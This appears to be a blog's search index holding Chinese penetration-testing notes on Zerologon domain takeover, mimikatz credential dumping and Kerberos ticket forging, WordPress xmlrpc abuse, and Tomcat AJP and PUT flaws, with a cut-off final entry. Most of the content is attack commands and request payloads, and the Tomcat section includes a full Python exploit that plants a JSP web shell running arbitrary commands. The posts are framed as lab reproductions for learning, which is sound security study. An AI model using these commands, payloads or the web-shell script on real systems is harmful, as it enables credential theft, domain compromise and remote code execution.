<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2020-1472漏洞复现过程</title>
    <link href="/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
    <url>/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>复现一下获取hash到获得shell的过程</p><a id="more"></a><h1 id="CVE-2020-1472漏洞复现过程"><a href="#CVE-2020-1472漏洞复现过程" class="headerlink" title="CVE-2020-1472漏洞复现过程"></a>CVE-2020-1472漏洞复现过程</h1><h2 id="00-漏洞相关"><a href="#00-漏洞相关" class="headerlink" title="00 漏洞相关"></a>00 漏洞相关</h2><p>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序</p><p><strong>影响范围</strong></p><pre><code class="hljs routeros">Windows<span class="hljs-built_in"> Server </span>2008 R2 <span class="hljs-keyword">for</span> x64-based Systems<span class="hljs-built_in"> Service </span>Pack 1Windows<span class="hljs-built_in"> Server </span>2008 R2 <span class="hljs-keyword">for</span> x64-based Systems<span class="hljs-built_in"> Service </span>Pack 1 (Server Core installation)Windows<span class="hljs-built_in"> Server </span>2012Windows<span class="hljs-built_in"> Server </span>2012 (Server Core installation)Windows<span class="hljs-built_in"> Server </span>2012 R2Windows<span class="hljs-built_in"> Server </span>2012 R2 (Server Core installation)Windows<span class="hljs-built_in"> Server </span>2016Windows<span class="hljs-built_in"> Server </span>2016 (Server Core installation)Windows<span class="hljs-built_in"> Server </span>2019Windows<span class="hljs-built_in"> Server </span>2019 (Server Core installation)Windows Server, version 1903 (Server Core installation)Windows Server, version 1909 (Server Core installation)Windows Server, version 2004 (Server Core installation)</code></pre><h2 id="01-环境搭建"><a href="#01-环境搭建" class="headerlink" title="01 环境搭建"></a>01 环境搭建</h2><ul><li>域控: windows server 2008 r2<ul><li>域名: Server08.com</li><li>主机名: AD-Server</li><li>用户: admin, administrator</li><li>ip: 192.168.2.208</li></ul></li><li>域内主机: windows7 sp1<ul><li>用户名: win7</li><li>ip: 192.168.2.207</li></ul></li><li>域外主机: mac</li></ul><h2 id="02-POC"><a href="#02-POC" class="headerlink" title="02 POC"></a>02 POC</h2><p><strong>以下过程均在域外主机mac上完成</strong></p><p>使用的<a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">脚本</a></p><pre><code class="hljs shell">python3 zerologon_tester.py 目标主机名 目标IP</code></pre><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>检测到目标可以漏洞</p><h2 id="03-Exploit"><a href="#03-Exploit" class="headerlink" title="03 Exploit"></a>03 Exploit</h2><p>使用的 <a href="https://github.com/Kamimuka/CVE-2020-1472" target="_blank" rel="noopener">脚本</a></p><pre><code class="hljs shell">python3 CVE-2020-1742.py nbios-name 目标主机名$ 目标IP</code></pre><p>nbios-name可以在修改计算机名出查看</p><p>计算机名==》更改==》其他</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>运行结果如图：</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>执行成功</p><h2 id="04-Secretsdump"><a href="#04-Secretsdump" class="headerlink" title="04 Secretsdump"></a>04 Secretsdump</h2><p>首先需要安装<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">impacket</a></p><p>下载后进入impacket目录,执行命令</p><pre><code class="hljs shell">sudo pip install .</code></pre><p>安装完成后进入examples文件夹，使用secretsdump.py脚本</p><pre><code class="hljs shell">python secretsdump.py 域名/目标主机名\$@目标IP -just-dc -no-pass</code></pre><p><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>成功导出了域控08和域内主机win7的hash</p><h2 id="05-wmiexec"><a href="#05-wmiexec" class="headerlink" title="05 wmiexec"></a>05 wmiexec</h2><p>获取hash后，使用impacket中的wmiexec.py进行hash传递，获取shell</p><pre><code class="hljs shell">python wmiexec.py 域名/用户名@目标IP -hashes LM-HASH:NT-HASH</code></pre><p>使用上一步获取的administrator的hash进行测试</p><p><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>成功获得shell并能执行命令</p><p>参考链接：</p><p><a href="https://blog.csdn.net/mukami0621/article/details/108605941" target="_blank" rel="noopener">https://blog.csdn.net/mukami0621/article/details/108605941</a></p><p><a href="https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ</a></p><p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></p><p><a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p><p><a href="https://github.com/Kamimuka/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/Kamimuka/CVE-2020-1472</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mimikatz中哈希与票据操作</title>
    <link href="/mimikatz%E4%B8%AD%E5%93%88%E5%B8%8C%E4%B8%8E%E7%A5%A8%E6%8D%AE%E6%93%8D%E4%BD%9C/"/>
    <url>/mimikatz%E4%B8%AD%E5%93%88%E5%B8%8C%E4%B8%8E%E7%A5%A8%E6%8D%AE%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>记录一下获取哈希及票据相关的操作命令</p><a id="more"></a><h1 id="mimikatz中哈希与票据操作"><a href="#mimikatz中哈希与票据操作" class="headerlink" title="mimikatz中哈希与票据操作"></a>mimikatz中哈希与票据操作</h1><h2 id="00-导出SAM和System读取"><a href="#00-导出SAM和System读取" class="headerlink" title="00 导出SAM和System读取"></a>00 导出SAM和System读取</h2><p>SAM文件位置：C:\Windows\System32\config</p><p>导出文件：</p><pre><code class="hljs q">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive         <span class="hljs-comment">//导出SAM</span>ref <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive   <span class="hljs-comment">//导出system</span></code></pre><p>读取SAM和System获取hash：<br>pwdump7:</p><pre><code class="hljs xml">pwdump7.exe -s <span class="hljs-tag">&lt;<span class="hljs-name">samfile\</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">systemfile\</span>&gt;</span></code></pre><p>mimikatz:</p><pre><code class="hljs groovy"><span class="hljs-string">lsadump:</span>:sam <span class="hljs-regexp">/sam:sam.hive /</span><span class="hljs-string">system:</span>system.hive <span class="hljs-comment">//使用mimikatz读取</span></code></pre><p>注意：<br>需要将sam.hive和system.hive放到本地mimikatz目录下</p><h2 id="01-读取本地SAM"><a href="#01-读取本地SAM" class="headerlink" title="01 读取本地SAM"></a>01 读取本地SAM</h2><pre><code class="hljs cpp">privilege::debug <span class="hljs-comment">//提升至debug权限</span>token::elevate   <span class="hljs-comment">//提升至system权限</span>lsadump::sam     <span class="hljs-comment">//读取SAM文件获取hash</span></code></pre><p>注意：<br>此方法需要在目标机器上运行mimikatz，需要考虑上传和免杀</p><h2 id="02-读取在线SAM"><a href="#02-读取在线SAM" class="headerlink" title="02 读取在线SAM"></a>02 读取在线SAM</h2><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre><p>注意：<br>要在mimikatz目录下打开命令行执行命令</p><h2 id="03-读取lsass-dmp"><a href="#03-读取lsass-dmp" class="headerlink" title="03 读取lsass.dmp"></a>03 读取lsass.dmp</h2><p>可以使用procdump导出lsass.dmp文件</p><pre><code class="hljs css"><span class="hljs-selector-tag">Procdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-acceptula</span> <span class="hljs-selector-tag">-ma</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.dmp</span></code></pre><p>使用mimikatz读取：</p><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp   <span class="hljs-comment">//加载dmp文件</span>sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span>  <span class="hljs-comment">//导出散列值</span></code></pre><h2 id="04-dcsync获取Hash"><a href="#04-dcsync获取Hash" class="headerlink" title="04 dcsync获取Hash"></a>04 dcsync获取Hash</h2><pre><code class="hljs groovy"><span class="hljs-string">lsadump:</span>:dcsync <span class="hljs-regexp">/domain:要获取的domain /</span>all <span class="hljs-regexp">/csv   /</span>/导出域中所有用户名及hash<span class="hljs-string">lsadump:</span>:dcsync <span class="hljs-regexp">/domain:目标域 /</span><span class="hljs-string">user:</span>目标用户</code></pre><p>注意：<br>可以在域中任意一台计算机执行，但要使用域管权限打开命令行环境</p><h2 id="05-在域控中获取Hash"><a href="#05-在域控中获取Hash" class="headerlink" title="05 在域控中获取Hash"></a>05 在域控中获取Hash</h2><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span><span class="hljs-built_in">log</span>                      <span class="hljs-comment">//先生成一个文本文件记录，防止内容太多无法显示</span>lsadump::lsa /inject     <span class="hljs-comment">//导出域内所有账号和Hash</span></code></pre><h2 id="06-哈希传递"><a href="#06-哈希传递" class="headerlink" title="06 哈希传递"></a>06 哈希传递</h2><p>获取hash：</p><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre><p>注入hash：</p><pre><code class="hljs less"><span class="hljs-attribute">privilege</span>::debug                                               <span class="hljs-comment">//提升至debug权限</span><span class="hljs-attribute">sekurlsa</span>::pth /<span class="hljs-attribute">user</span>:目标用户名 /<span class="hljs-attribute">domain</span>:目标域 /<span class="hljs-attribute">ntlm</span>:获取的hash    <span class="hljs-comment">//注入hash</span></code></pre><p>成功后自动弹出一个新的shell<br>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>使用mimikatz进行哈希传递要具有本地管理员权限</p><h2 id="07-密钥传递"><a href="#07-密钥传递" class="headerlink" title="07 密钥传递"></a>07 密钥传递</h2><p>获取aes256密钥：</p><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::ekeys          <span class="hljs-comment">//获取密钥及其他用户信息</span></code></pre><p>传递密钥：</p><pre><code class="hljs less"><span class="hljs-attribute">privilege</span>::debug                                               <span class="hljs-comment">//提升至debug权限</span><span class="hljs-attribute">sekurlsa</span>::pth /<span class="hljs-attribute">user</span>:目标用户名 /<span class="hljs-attribute">domain</span>:目标域 /<span class="hljs-attribute">aes256</span>:获取的密钥   <span class="hljs-comment">//注入密钥</span></code></pre><p>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>使用mimikatz进行哈希传递要具有本地管理员权限<br>aes128密钥也可以进行传递<br>目标机器需要安装KB2871997<br>如果安装了KB28711997，仍可以使用SID为500的用户进行哈希传递</p><h2 id="08-票据传递"><a href="#08-票据传递" class="headerlink" title="08 票据传递"></a>08 票据传递</h2><p>ptc方法：</p><pre><code class="hljs cpp">kerberos::purge         <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>kerberos::<span class="hljs-built_in">list</span>          <span class="hljs-comment">//查看当前机器凭证</span>kerberos::ptc 票据文件   <span class="hljs-comment">//将票据注入到内存中</span>klist                   <span class="hljs-comment">//查看是否注入成功</span></code></pre><p>ptt方法：</p><pre><code class="hljs cpp">privilege::debug           <span class="hljs-comment">//提升至debug权限</span>sekurlsa::tickets /exports <span class="hljs-comment">//将内存中的票据导出至当前目录</span>kerberos::purge            <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>kerberos::ptt <span class="hljs-string">"票据路径"</span>    <span class="hljs-comment">//将票据注入内存</span>klist                      <span class="hljs-comment">//查看是否注入成功</span></code></pre><p>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>票据注入内存默认有效时间10个小时<br>在目标机器上不需要本地管理员权限就可以进行票据传递</p><h2 id="09-黄金票据"><a href="#09-黄金票据" class="headerlink" title="09 黄金票据"></a>09 黄金票据</h2><p>利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p><ul><li>需要的信息：</li><li>要伪造的域管理员用户名</li><li>完整的域名</li><li>域SID</li><li>krbtgt的NTLM Hash<br>在域控中进行操作：<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>lsadump::lsa /patch      <span class="hljs-comment">// 专用于在域控制器上导出用户密码或hash</span></code></pre>在普通用户主机进行操作：<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/user:需要伪造的域管理员用户名 /</span><span class="hljs-string">domain:</span>demo.com <span class="hljs-regexp">/sid:域sid /</span><span class="hljs-string">krbtgt:</span> krbtgt用户的Hash <span class="hljs-regexp">/ticket:test.kirbi       /</span>/伪造凭证，保存为test.kirbi<span class="hljs-string">kerberos:</span>:ptt &lt;票据文件&gt;   <span class="hljs-comment">//注入</span><span class="hljs-string">kerberos:</span>:tgt             <span class="hljs-comment">//查看当前票据</span></code></pre>之后即可在普通用户主机上使用net use进行登录，伪造的黄金票据可以看做一个后门</li></ul><h2 id="10-白银票据"><a href="#10-白银票据" class="headerlink" title="10 白银票据"></a>10 白银票据</h2><p>白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC<br>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值<br>需要的信息：</p><ul><li><p>域名</p></li><li><p>域SID</p></li><li><p>目标服务器的FQDN <em>全限定域名：同时带有主机名和域名的名称</em></p></li><li><p>可利用的服务</p></li><li><p>服务账号的NTLM Hash</p></li><li><p>要伪造的用户名<br>在域控中的操作：</p><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre><p>在普通用户主机的操作：</p><pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/domain:域名 /</span><span class="hljs-string">sid:</span>域SID值 <span class="hljs-regexp">/target:域控名 /</span><span class="hljs-string">rc4:</span>域控的NTLM hash <span class="hljs-regexp">/service:可利用的服务，如cifs /</span><span class="hljs-string">user:</span>要伪造的用户名，可任意填写 /ptt 表示立即注入</code></pre><p>常用的服务名有以下:</p><pre><code class="hljs routeros">服务名称                    同时需要的服务WMI                        HOST、RPCSSPowerShell Remoting        HOST、HTTPWinRM                    HOST、HTTPScheduled Tasks            HOSTWindows File Share        CIFSLDAP                    LDAPWindows Remote<span class="hljs-built_in"> Server </span>   RPCSS、LDAP、CIFS</code></pre><p>黄金票据与白银票据的区别：</p></li><li><p>访问权限不同</p><ul><li>黄金票据:伪造TGT,可以获取任何Kerberos服务权限</li><li>白银票据:伪造TGS,只能访问指定的服务</li></ul></li><li><p>加密方式不同</p><ul><li>黄金票据:由Kerberos的Hash—&gt; krbtgt加密</li><li>白银票据:由服务器端密码的Hash值—&gt; master key 加密</li></ul></li><li><p>认证流程不同</p><ul><li>黄金票据:利用过程需要访问域控(KDC)</li><li>白银票据:可以直接跳过 KDC 直接访问对应的服务器</li></ul></li></ul><p>参考：</p><p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p><p>[<a href="https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/]</a>(<a href="https://www.k0rz3n.com/2019/03/17/浅析" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/17/浅析</a> Kerberos 认证过程以及黄金票据和白银票据/)</p><p><a href="https://www.freebuf.com/articles/network/245872.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/245872.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wordpress中xmlrpc的利用</title>
    <link href="/wordpress%E4%B8%ADxmlrpc%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <url>/wordpress%E4%B8%ADxmlrpc%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>利用WordPress的xmlrpc进行ddos、SSRF与暴力破解</p><a id="more"></a><h1 id="wordpress中xmlrpc的利用"><a href="#wordpress中xmlrpc的利用" class="headerlink" title="wordpress中xmlrpc的利用"></a>wordpress中xmlrpc的利用</h1><h2 id="00-利用pingback进行ddos攻击"><a href="#00-利用pingback进行ddos攻击" class="headerlink" title="00 利用pingback进行ddos攻击"></a>00 利用pingback进行ddos攻击</h2><p>pingback会自动向连接发送ping请求</p><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p><pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;    &lt;params&gt;    &lt;param&gt;&lt;value&gt;      &lt;string&gt;目标网站&lt;&#x2F;string&gt;      &lt;&#x2F;value&gt;&lt;&#x2F;param&gt;    &lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;</code></pre><p>需要注意的是出于测试目的需要在报头中加上</p><pre><code class="hljs pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/<span class="hljs-type">xml</span></code></pre><p>否则XML-RPC 服务会认为该请求不合法</p><p><strong>可以将目标网站设为dnslog，用于获取wordpress站点的真实IP</strong></p><h2 id="01-利用pingback进行SSRF"><a href="#01-利用pingback进行SSRF" class="headerlink" title="01 利用pingback进行SSRF"></a>01 利用pingback进行SSRF</h2><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p><pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;    &lt;params&gt;    &lt;param&gt;&lt;value&gt;      &lt;string&gt;目标IP:端口&lt;&#x2F;string&gt;      &lt;&#x2F;value&gt;&lt;&#x2F;param&gt;    &lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;</code></pre><p>根据返回包判断端口开放情况</p><h2 id="02-利用getUsersBlogs进行暴力破解"><a href="#02-利用getUsersBlogs进行暴力破解" class="headerlink" title="02 利用getUsersBlogs进行暴力破解"></a>02 利用getUsersBlogs进行暴力破解</h2><p>通常wordpress登录接口都是做了防暴力破解防护的，利用xmlrpc.php提供的接口尝试猜解用户的密码，可以绕过wordpress对暴力破解的限制</p><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p><pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;    &lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;    &lt;params&gt;    &lt;param&gt;&lt;value&gt;username&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;      &lt;param&gt;&lt;value&gt;password&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;    &lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;</code></pre><p>根据返回包判断爆破结果</p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>WordPress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tomcat AJP文件包含漏洞与PUT写文件漏洞</title>
    <link href="/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>vulhub学习AJP文件包含漏洞与PUT写文件漏洞</p><a id="more"></a><h1 id="AJP文件包含漏洞与PUT写文件漏洞"><a href="#AJP文件包含漏洞与PUT写文件漏洞" class="headerlink" title="AJP文件包含漏洞与PUT写文件漏洞"></a>AJP文件包含漏洞与PUT写文件漏洞</h1><h2 id="AJP文件包含漏洞CVE-2020-1938"><a href="#AJP文件包含漏洞CVE-2020-1938" class="headerlink" title="AJP文件包含漏洞CVE-2020-1938"></a>AJP文件包含漏洞CVE-2020-1938</h2><h3 id="00-环境搭建"><a href="#00-环境搭建" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h3><ul><li>docker路径 tomcat/CVE-2020-1938</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><h3 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h3><p>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口</p><p>漏洞是Tomcat AJP协议存在缺陷而导致，攻击者利用漏洞可以构造特定参数，读取服务器webapp/ROOT下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步通过文件包含实现远程代码执行</p><p><strong>影响范围</strong></p><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="02-复现"><a href="#02-复现" class="headerlink" title="02 复现"></a>02 复现</h3><p>从docker启动镜像，打开ip:8080</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>启动成功，版本为9.0.30</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/" target="_blank" rel="noopener">POC</a> </p><p><strong>注意要用python2运行</strong></p><p>使用方法：</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><p>默认端口8009</p><p>默认读取文件路径WEB-INF/web.xml</p><p>运行后读取成功</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><h2 id="PUT写文件漏洞CVE-2017-12615"><a href="#PUT写文件漏洞CVE-2017-12615" class="headerlink" title="PUT写文件漏洞CVE-2017-12615"></a>PUT写文件漏洞CVE-2017-12615</h2><h3 id="00-环境搭建-1"><a href="#00-环境搭建-1" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h3><ul><li>docker路径 tomcat/CVE-2017-12615</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><h3 id="01-原理-1"><a href="#01-原理-1" class="headerlink" title="01 原理"></a>01 原理</h3><p>漏洞的产生是由于配置不当（非默认配置），将配置文件（conf/web.xml）中的readonly设置为了false，导致可以使用PUT方法上传任意文件</p><p><strong>影响范围</strong></p><ul><li>7.0.0~7.0.79</li></ul><h3 id="02-复现-1"><a href="#02-复现-1" class="headerlink" title="02 复现"></a>02 复现</h3><p>从docker启动镜像，打开ip:8080</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>启动成功，版本为8.5.19 <em>不知道为什么与影响范围不同</em></p><p>用burpsuite发包，查看响应发现写入成功</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>请求内容</p><pre><code class="hljs"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/test1.jsp/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.2.108:8080<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept-Language</span>: en<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 43&lt;%out.println("Hello World");%&gt;</code></pre><p>访问 test1.jsp</p><p><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>成功执行jsp代码</p><p><strong>几个绕过方法</strong></p><ul><li>shell.jsp%20</li><li>shell.jsp::$DATA</li><li>shell.jsp/</li></ul><p><strong>一个利用脚本</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> time<span class="hljs-string">'''</span><span class="hljs-string">Usage:</span><span class="hljs-string">python CVE-2017-12615.py http://127.0.0.1</span><span class="hljs-string"></span><span class="hljs-string">shell: http://127.0.0.1/py1.jsp?pwd=pass&amp;cmd=whoami</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">'''</span>proxies = &#123;  <span class="hljs-string">"http"</span>: <span class="hljs-string">"http://127.0.0.1:8080"</span>,  <span class="hljs-string">"https"</span>: <span class="hljs-string">"http://127.0.0.1:8080"</span>,&#125;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(url)</span>:</span>user_agent=<span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"</span>headers=&#123;<span class="hljs-string">"User-Agent"</span>:user_agent&#125;data=<span class="hljs-string">"""&lt;%</span><span class="hljs-string">    if("pass".equals(request.getParameter("pwd")))&#123;</span><span class="hljs-string">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();</span><span class="hljs-string">        int a = -1;</span><span class="hljs-string">        byte[] b = new byte[2048];</span><span class="hljs-string">        out.print("&lt;pre&gt;");</span><span class="hljs-string">        while((a=in.read(b))!=-1)&#123;</span><span class="hljs-string">            out.println(new String(b));</span><span class="hljs-string">        &#125;</span><span class="hljs-string">        out.print("&lt;/pre&gt;");</span><span class="hljs-string">    &#125;</span><span class="hljs-string">%&gt;"""</span><span class="hljs-keyword">try</span>:requests.put(url, headers=headers, data=data, proxies=proxies)time.sleep(<span class="hljs-number">2</span>)verify_response = requests.get(url[:<span class="hljs-number">-1</span>], headers=headers)<span class="hljs-keyword">if</span>(verify_response.status_code == <span class="hljs-number">200</span>):print(<span class="hljs-string">'success!'</span>)<span class="hljs-keyword">else</span> :print(verify_response.status_code)<span class="hljs-keyword">except</span> :print(<span class="hljs-string">"error"</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:target_url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">'/py1.jsp/'</span>attack(target_url)print(<span class="hljs-string">'shell: '</span> + target_url[:<span class="hljs-number">-1</span>])</code></pre><p>密码pwd为pass</p><p>指令cmd为自己输入</p><p><em>以上设置了代理可以用于抓包分析，不需要可以去掉</em></p><p>执行成功</p><p><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>访问并执行whoami命令</p><p><img src="8.png" srcset="/img/loading.gif" alt=""></p><p>执行成功</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>vulhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub DNS域传送漏洞</title>
    <link href="/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/"/>
    <url>/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
    
